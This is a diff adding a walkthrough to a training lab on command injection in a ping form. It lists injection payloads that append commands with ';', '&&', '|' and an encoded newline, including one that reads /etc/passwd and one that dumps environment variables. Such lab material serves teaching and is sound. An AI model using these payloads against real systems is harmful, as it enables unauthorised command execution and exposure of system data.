@@ -16,6 +16,24 @@ Exploit the command injection vulnerability to execute arbitrary commands on the
 1. **Access the Lab**: 
    - This is running on the `shell-inject` container on the `10.6.6.34` IP address. Access the lab at `http://10.6.6.34:5002`
 
+## Walkthrough
+
+1. Access the lab at `http://10.6.6.34:5002`.
+2. Enter a valid IP address like `127.0.0.1` and click "Ping Host".
+3. Observe the normal ping output.
+4. Now try injecting a command using the `;` operator:
+   - Payload: `127.0.0.1; whoami`
+5. You should see the ping output followed by the username of the running process.
+6. Try more advanced payloads:
+   - List files: `127.0.0.1; ls -la`
+   - Read passwd file: `127.0.0.1; cat /etc/passwd`
+   - Check current directory: `127.0.0.1; pwd`
+   - View environment variables: `127.0.0.1; env`
+7. Alternative command separators to try:
+   - Using `&&`: `127.0.0.1 && whoami`
+   - Using `|`: `127.0.0.1 | whoami`
+   - Using newline: `127.0.0.1%0Awhoami` (URL encoded)
+
 ## Explanation
 The application constructs a shell command like this:
 ```python
